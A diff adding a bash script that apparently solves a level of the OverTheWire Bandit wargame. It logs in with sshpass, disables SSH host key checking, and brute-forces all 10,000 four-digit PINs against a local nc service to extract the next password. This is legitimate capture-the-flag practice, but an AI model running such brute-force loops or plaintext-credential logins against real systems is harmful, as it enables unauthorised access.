@@ -1,0 +1,4 @@
+#!/bin/bash
+
+PASS=$(cat 23.pass)
+sshpass -p $PASS ssh -q -o StrictHostKeyChecking=no -p 2220 bandit24@bandit.labs.overthewire.org "for i in {0..9999}; do echo $PASS \$i; done | nc localhost 30002 | grep \"The password\" | grep -o \"[A-Za-z0-9]\\+$\""
